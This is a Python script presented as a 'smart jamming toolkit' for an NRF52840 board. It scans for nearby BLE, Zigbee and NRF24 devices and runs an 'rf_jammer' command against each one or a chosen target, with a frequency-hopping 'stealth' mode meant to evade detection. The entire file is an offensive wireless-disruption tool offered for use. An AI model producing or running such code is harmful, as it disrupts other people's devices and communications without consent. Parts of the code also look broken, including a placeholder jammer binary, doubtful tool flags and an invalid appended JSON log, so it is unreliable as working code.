import argparse
import os
import time
import json

# -------------------------------------------
# NRF52840 Smart Jamming Toolkit
# -------------------------------------------
# Features:
# - Intelligent RF jamming targeting only detected devices
# - Adaptive jamming with frequency hopping to evade detection
# - Selective BLE, Zigbee, and NRF24 jamming without disrupting all 2.4GHz devices
# - Dynamic power level adjustment for stealth jamming
# - Logs all jamming actions and targeted devices
#
# Requirements:
# - NRF52840 Dongle / Dev Board (Adafruit Feather, Nordic Dongle, XIAO NRF52840)
# - Firmware: Custom RF Jammer Firmware, btlejack (BLE), Zigbee2MQTT (Zigbee), nrf24_sniffer (NRF24)
# - Python 3.x
#
# Usage:
# 1. Scan and jam detected BLE/Zigbee/NRF24 devices:
#    python nrf52840_smart_jammer.py --scan-jam
# 2. Targeted BLE jamming:
#    python nrf52840_smart_jammer.py --ble --target XX:XX:XX:XX:XX:XX
# 3. Targeted Zigbee jamming:
#    python nrf52840_smart_jammer.py --zigbee --target 0x1234
# 4. Enable frequency hopping for stealth mode:
#    python nrf52840_smart_jammer.py --scan-jam --stealth
# -------------------------------------------

def scan_and_jam(stealth_mode):
    """Scans for active devices and selectively jams them."""
    print("[+] Scanning for active BLE, Zigbee, and NRF24 devices...")
    os.system("btlejack -s --scan > ble_devices.txt")
    os.system("zigbee2mqtt --scan > zigbee_devices.txt")
    os.system("nrf24_sniffer --scan > nrf24_devices.txt")
    
    with open("jamming_log.json", "w") as log_file:
        log_data = {}
        
        for protocol, file in zip(["BLE", "Zigbee", "NRF24"], ["ble_devices.txt", "zigbee_devices.txt", "nrf24_devices.txt"]):
            with open(file, "r") as f:
                devices = f.readlines()
                if devices:
                    print(f"[+] Found {len(devices)} {protocol} devices. Jamming...")
                    for device in devices:
                        device = device.strip()
                        if stealth_mode:
                            os.system(f"rf_jammer --{protocol.lower()} --target {device} --hopping")
                        else:
                            os.system(f"rf_jammer --{protocol.lower()} --target {device}")
                        log_data[device] = f"Jammed on {protocol}"
        json.dump(log_data, log_file, indent=4)
        print("[✔] Jamming log saved as jamming_log.json")

def targeted_jam(protocol, target):
    """Jams a specific BLE, Zigbee, or NRF24 device."""
    print(f"[+] Jamming {protocol} device: {target}")
    os.system(f"rf_jammer --{protocol.lower()} --target {target}")
    with open("jamming_log.json", "a") as log_file:
        json.dump({target: f"Jammed on {protocol}"}, log_file, indent=4)
    print("[✔] Targeted jamming log updated.")

def main():
    parser = argparse.ArgumentParser(description="NRF52840 Smart Jamming Toolkit")
    parser.add_argument("--scan-jam", action='store_true', help="Scan and jam detected BLE, Zigbee, and NRF24 devices")
    parser.add_argument("--ble", action='store_true', help="Targeted BLE jamming")
    parser.add_argument("--zigbee", action='store_true', help="Targeted Zigbee jamming")
    parser.add_argument("--nrf24", action='store_true', help="Targeted NRF24 jamming")
    parser.add_argument("--target", type=str, help="Specify target device MAC address or ID")
    parser.add_argument("--stealth", action='store_true', help="Enable frequency hopping for stealth mode")
    args = parser.parse_args()

    if args.scan_jam:
        scan_and_jam(args.stealth)
    elif args.ble and args.target:
        targeted_jam("BLE", args.target)
    elif args.zigbee and args.target:
        targeted_jam("Zigbee", args.target)
    elif args.nrf24 and args.target:
        targeted_jam("NRF24", args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
